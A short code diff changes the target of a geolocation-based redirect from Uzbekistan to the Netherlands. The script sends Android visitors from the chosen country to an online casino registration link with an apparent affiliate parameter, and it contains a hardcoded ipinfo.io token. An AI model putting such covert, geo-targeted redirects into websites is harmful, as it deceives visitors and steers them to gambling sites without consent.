@@ -14,7 +14,7 @@
         const response = await fetch('https://ipinfo.io/json?token=dffa7b5fd952e3'); // Вставьте ваш токен
         const data = await response.json();
 
-        if (isAndroid && data.country === 'UZ') {
+        if (isAndroid && data.country === 'NL') {
           // Перенаправляем Android пользователей из Узбекистана
           window.location.href = "https://1wyfui.life/casino/list?open=register&p=wd7b";
         } else {
